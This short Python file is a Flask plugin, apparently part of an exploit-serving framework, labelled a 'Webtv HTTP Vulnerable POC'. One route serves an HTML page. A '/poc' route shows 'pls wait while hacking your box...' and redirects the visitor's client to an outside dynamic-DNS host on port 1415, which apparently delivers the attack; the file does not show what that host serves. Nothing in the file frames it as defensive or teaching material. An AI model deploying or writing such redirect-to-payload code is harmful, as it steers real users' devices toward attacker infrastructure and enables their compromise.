from base import Plugin, Flask, general_gen
from flask import Response

class WebtvPOC(Plugin):
    id = 'bebtv_hacking'
    name = 'Webtv HTTP Vulnerable POC'
    def app_setup(self, app: Flask):
        @app.route("/webtv_hacking")
        def webtv_hack():
            return general_gen("webtv_fucking.html")
        @app.route("/webtv_hacking/poc")
        def hack_it():
            return Response('<h1>pls wait while hacking your box...</h1>', 300, {'Location': 'http://tendhost.ddns.net:1415/'})